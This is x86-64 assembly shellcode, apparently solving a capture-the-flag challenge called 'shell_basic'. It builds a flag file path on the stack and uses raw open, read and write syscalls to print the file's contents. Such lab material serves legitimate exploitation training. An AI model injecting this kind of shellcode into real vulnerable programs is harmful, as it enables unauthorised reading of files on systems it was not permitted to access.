section .text
global _start
_start:
    ; Push and Open
    push 0
    mov rax, 0x676E6F6F6F6F6F6F ; push 'oooooong'
    push rax
    mov rax, 0x6C5F73695F656D61 ; push 'ame_is_l'
    push rax
    mov rax, 0x6E5F67616C662F63 ; push 'c/flag_n'
    push rax
    mov rax, 0x697361625f6c6c65 ; push 'ell_basi'
    push rax
    mov rax, 0x68732f656d6f682f ; push '/home/sh'
    push rax
    mov rdi, rsp    ; rdi = "/home/shell_basic/flag_name_is_loooooong"
    xor rsi, rsi    ; rsi = 0 ; RD_ONLY
    xor rdx, rdx    ; rdx = 0
    mov rax, 2      ; rax = 2 ; syscall_open
    syscall         ; open("/home/shell_basic/flag_name_is_loooooong", RD_ONLY, NULL)

    ; Read, len 
    mov rdi, rax      ; rdi = fd, rdi has len value from Open syscall
    mov rsi, rsp
    sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
    mov rdx, 0x30     ; rdx = 0x30     ; len
    mov rax, 0x0      ; rax = 0        ; syscall_read
    syscall           ; read(fd, buf, 0x30)

    ; Write
    mov rdi, 1        ; rdi = 1 ; fd = stdout
    mov rax, 0x1      ; rax = 1 ; syscall_write
    syscall           ; write(fd, buf, 0x30)

    ; Exit
    mov rax, 0x3C     ; rax = 60
    mov rdi, 0        ; rdi = 0
    syscall           ; exit
